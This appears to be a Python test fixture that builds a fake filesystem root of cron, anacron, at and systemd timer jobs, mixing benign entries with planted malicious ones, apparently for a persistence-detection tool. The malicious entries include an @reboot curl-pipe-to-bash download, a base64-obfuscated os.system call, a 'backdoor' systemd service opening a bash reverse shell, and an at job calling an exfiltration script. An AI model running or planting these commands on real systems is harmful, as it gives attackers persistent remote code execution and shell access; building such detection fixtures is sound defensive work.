"""Build a synthetic filesystem root with a spread of scheduled jobs."""

from __future__ import annotations

from pathlib import Path

SYSTEM_CRONTAB = """\
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily
# a comment
*/10 *  * * *   backup  /usr/local/bin/snapshot.sh
"""

CRON_D_MDADM = """\
PATH=/usr/bin:/bin
57 0 * * 0 root /usr/share/mdadm/checkarray --cron --all --idle --quiet
"""

CRON_D_EVIL = """\
PATH=/tmp:/usr/bin
@reboot root curl -s http://198.51.100.7/x | bash
*/2 * * * * www-data python3 -c "import base64,os;os.system(base64.b64decode('aWQ=').decode())"
"""

USER_CRONTAB_ALICE = """\
# m h  dom mon dow   command
0 9 * * mon-fri /home/alice/report.sh
@daily /usr/bin/backup-home
30 3 1 * * /usr/bin/find /home/alice -name '*.tmp' -delete
"""

ANACRONTAB = """\
SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
"""

TIMER = """\
[Unit]
Description=Daily apt download activities

[Timer]
OnCalendar=*-*-* 6,18:00
RandomizedDelaySec=12h
Persistent=true

[Install]
WantedBy=timers.target
"""

SERVICE = """\
[Unit]
Description=Daily apt download activities

[Service]
Type=oneshot
ExecStart=/usr/lib/apt/apt.systemd.daily update
User=root
"""

EVIL_TIMER = """\
[Unit]
Description=totally normal

[Timer]
OnBootSec=30s
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
"""

EVIL_SERVICE = """\
[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"
"""

# at spool file: queue 'a', job 00001, minutes-since-epoch 0x01b8bf80 (2021-ish)
AT_NAME = "a00001" + format(27_180_000, "08x")
AT_BODY = """\
#!/bin/sh
# atrun uid=1000 gid=1000
umask 22
PATH=/usr/bin:/bin; export PATH
cd /home/bob || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
/usr/local/bin/exfil.sh --dest 0.0.0.0:9001
"""


def build_root(base: Path) -> Path:
    root = base / "image"

    def w(rel: str, text: str):
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        return p

    w("etc/crontab", SYSTEM_CRONTAB)
    w("etc/cron.d/mdadm", CRON_D_MDADM)
    w("etc/cron.d/0hourly-evil", CRON_D_EVIL)
    w("etc/anacrontab", ANACRONTAB)
    w("var/spool/cron/crontabs/alice", USER_CRONTAB_ALICE)
    w("var/spool/cron/crontabs/root", "@reboot /opt/agent/run\n")

    for name in ("cron.hourly", "cron.daily", "cron.weekly", "cron.monthly"):
        w(f"etc/{name}/.placeholder", "")
    w("etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n")
    w("etc/cron.daily/apt-compat", "#!/bin/sh\n")
    w("etc/cron.hourly/0anacron", "#!/bin/sh\n")  # should be skipped

    w("usr/lib/systemd/system/apt-daily.timer", TIMER)
    w("usr/lib/systemd/system/apt-daily.service", SERVICE)
    w("etc/systemd/system/backdoor.timer", EVIL_TIMER)
    w("etc/systemd/system/backdoor.service", EVIL_SERVICE)
    wd = root / "etc/systemd/system/timers.target.wants"
    wd.mkdir(parents=True, exist_ok=True)
    (wd / "apt-daily.timer").write_text("(symlink placeholder)")

    w(f"var/spool/cron/atjobs/{AT_NAME}", AT_BODY)
    w("var/spool/cron/atjobs/.SEQ", "00001")

    return root
